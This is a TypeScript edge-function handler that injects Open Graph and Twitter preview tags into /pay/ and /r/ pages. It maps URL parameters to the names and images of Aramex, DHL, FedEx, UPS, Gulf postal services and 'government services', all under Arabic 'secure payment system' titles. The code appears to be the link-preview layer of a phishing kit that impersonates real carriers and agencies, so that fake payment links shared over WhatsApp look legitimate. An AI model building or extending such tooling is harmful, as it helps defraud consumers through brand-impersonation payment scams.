export default async function handler(request: Request, context: { next: () => Promise<Response> }) {
  try {
    const url = new URL(request.url);
    const path = url.pathname;

    // Process both /pay/* and /r/* paths for OG tags
    const shouldProcess = path.startsWith('/pay/') || path.startsWith('/r/');
    
    if (!shouldProcess) {
      return context.next();
    }

    // Extract company/service from URL
    let company = url.searchParams.get('company') || url.searchParams.get('service') || 'aramex';
    let serviceType = 'shipping';
    
    // Detect service type from path
    if (path.includes('/chalet/')) {
      serviceType = 'chalet';
      company = url.searchParams.get('service') || 'chalet';
    } else if (path.includes('/health/')) {
      serviceType = 'health';
      company = url.searchParams.get('service') || 'health';
    } else if (path.includes('/government/')) {
      serviceType = 'government';
      company = url.searchParams.get('service') || 'government';
    } else if (path.includes('/logistics/')) {
      serviceType = 'logistics';
      company = url.searchParams.get('service') || 'logistics';
    }

    console.log('OG Injector:', { path, company, serviceType });

    const response = await context.next();
    const html = await response.text();
    const origin = url.origin;

    // Comprehensive company/service to OG image mapping
    const serviceImages: Record<string, string> = {
      // Shipping services
      'aramex': `${origin}/og-aramex.jpg`,
      'dhl': `${origin}/og-dhl.jpg`,
      'dhlkw': `${origin}/og-dhl.jpg`,
      'dhlqa': `${origin}/og-dhl.jpg`,
      'dhlom': `${origin}/og-dhl.jpg`,
      'dhlbh': `${origin}/og-dhl.jpg`,
      'fedex': `${origin}/og-fedex.jpg`,
      'ups': `${origin}/og-ups.jpg`,
      'empost': `${origin}/og-empost.jpg`,
      'smsa': `${origin}/og-smsa.jpg`,
      'zajil': `${origin}/og-zajil.jpg`,
      'naqel': `${origin}/og-naqel.jpg`,
      'saudipost': `${origin}/og-saudipost.jpg`,
      'kwpost': `${origin}/og-kwpost.jpg`,
      'qpost': `${origin}/og-qpost.jpg`,
      'omanpost': `${origin}/og-omanpost.jpg`,
      'bahpost': `${origin}/og-bahpost.jpg`,
      'albaraka': `${origin}/og-albaraka.jpg`,
      'alfuttaim': `${origin}/og-alfuttaim.jpg`,
      'alshaya': `${origin}/og-alshaya.jpg`,
      'shipco': `${origin}/og-shipco.jpg`,
      'hellmann': `${origin}/og-hellmann.jpg`,
      'dsv': `${origin}/og-dsv.jpg`,
      'jinaken': `${origin}/og-jinaken.jpg`,
      'genacom': `${origin}/og-genacom.jpg`,
      
      // Service type defaults
      'chalet': `${origin}/og-chalet.jpg`,
      'health': `${origin}/og-health.jpg`,
      'government': `${origin}/og-government.jpg`,
      'logistics': `${origin}/og-logistics.jpg`,
      'payment': `${origin}/og-payment.jpg`,
    };

    // Service display names
    const serviceNames: Record<string, string> = {
      // Shipping
      'aramex': 'أرامكس - Aramex',
      'dhl': 'دي إتش إل - DHL',
      'fedex': 'فيديكس - FedEx',
      'ups': 'يو بي إس - UPS',
      'empost': 'البريد الإماراتي',
      'smsa': 'سمسا',
      'zajil': 'زاجل',
      'naqel': 'ناقل',
      'saudipost': 'البريد السعودي',
      'kwpost': 'البريد الكويتي',
      'qpost': 'البريد القطري',
      'omanpost': 'البريد العُماني',
      'bahpost': 'البريد البحريني',
      'albaraka': 'مجموعة البركة',
      'alfuttaim': 'مجموعة الفطيم',
      'alshaya': 'مجموعة الشايع',
      'shipco': 'شركة الشحن العالمية',
      'hellmann': 'هايلمان العالمية',
      'dsv': 'دي إس في',
      'jinaken': 'جيناكم',
      'genacom': 'جيناكم',
      
      // Service types
      'chalet': 'حجز الشاليهات',
      'health': 'الخدمات الصحية',
      'government': 'الخدمات الحكومية',
      'logistics': 'الخدمات اللوجستية',
      'payment': 'خدمات الدفع',
    };

    const serviceName = serviceNames[company.toLowerCase()] || company;
    
    // Service type descriptions
    const serviceDescriptions: Record<string, string> = {
      'shipping': 'خدمات الشحن والتوصيل السريع في دول الخليج',
      'chalet': 'احجز شاليه أحلامك في دول الخليج بأسعار مميزة',
      'health': 'خدمات طبية وصحية معتمدة - احجز موعدك الآن',
      'government': 'الخدمات الحكومية والرسوم الرسمية - ادفع بسهولة وأمان',
      'logistics': 'حلول لوجستية متكاملة - تخزين وشحن وتوزيع',
      'payment': 'بوابة دفع آمنة وموثوقة',
    };

    const ogImage = serviceImages[company.toLowerCase()] || 
                    serviceImages[serviceType] || 
                    `${origin}/og-aramex.jpg`;

    const ogTitle = `${serviceName} - نظام الدفع الآمن`;
    const ogDescription = serviceDescriptions[serviceType] || 
                         `إكمال دفع ${serviceName} - بوابة دفع آمنة وموثوقة في دول الخليج`;

    const ogTags = `
    <!-- Open Graph / Facebook / WhatsApp - Server Injected -->
    <meta property="og:type" content="website" />
    <meta property="og:url" content="${url.href}" />
    <meta property="og:title" content="${ogTitle}" />
    <meta property="og:description" content="${ogDescription}" />
    <meta property="og:image" content="${ogImage}" />
    <meta property="og:image:secure_url" content="${ogImage}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:image:alt" content="${serviceName}" />
    <meta property="og:site_name" content="نظام الدفع الموحد - دول الخليج" />
    <meta property="og:locale" content="ar_AR" />

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:site" content="@GulfPayment" />
    <meta name="twitter:title" content="${ogTitle}" />
    <meta name="twitter:description" content="${ogDescription}" />
    <meta name="twitter:image" content="${ogImage}" />
    <meta name="twitter:image:alt" content="${serviceName}" />
    
    <!-- WhatsApp specific -->
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:determiner" content="the" />
    `;

    // Remove existing OG and Twitter tags
    let modifiedHtml = html.replace(
      /<meta\s+(?:property|name)=["'](?:og:|twitter:)[^"']+["'][^>]*>\s*/gi,
      ''
    );

    // Inject new OG tags after <head>
    modifiedHtml = modifiedHtml.replace(
      /<head[^>]*>/i,
      (match) => `${match}\n${ogTags.trim()}`
    );

    console.log('OG Injector: Tags injected', { company, serviceType, serviceName, ogImage });

    return new Response(modifiedHtml, {
      status: response.status,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'public, max-age=0, must-revalidate',
        'X-OG-Injected': 'true',
        'X-Service-Type': serviceType,
        'X-Service-Name': company
      }
    });

  } catch (error) {
    console.error('OG Injector Error:', error);
    return context.next();
  }
}
